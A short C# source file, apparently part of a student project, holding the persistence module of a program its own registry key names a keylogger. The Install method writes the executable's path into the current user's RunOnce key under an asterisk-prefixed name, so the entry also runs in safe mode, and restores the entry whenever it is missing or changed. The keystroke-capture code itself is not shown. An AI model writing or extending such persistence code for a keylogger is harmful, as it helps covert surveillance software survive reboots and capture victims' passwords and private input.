using Microsoft.Win32;
using System;

namespace ConsoleApplicationTest
{
    class Autostart
    {
        const string RegistryPath = @"Software\Microsoft\Windows\CurrentVersion\RunOnce";
        const string KeyName = "*VSB-PVPBS-Keylogger";

        public void Install()
        {
            var applicationPath = Environment.GetCommandLineArgs()[0];

            using (var key = Registry.CurrentUser.OpenSubKey(RegistryPath, true))
            {
                var currentValue = (string)key.GetValue(KeyName);
                if (currentValue == null || currentValue != applicationPath)
                {
                    Console.WriteLine("Registry updated");
                    key.SetValue(KeyName, applicationPath);
                }
            }
        }
    }
}
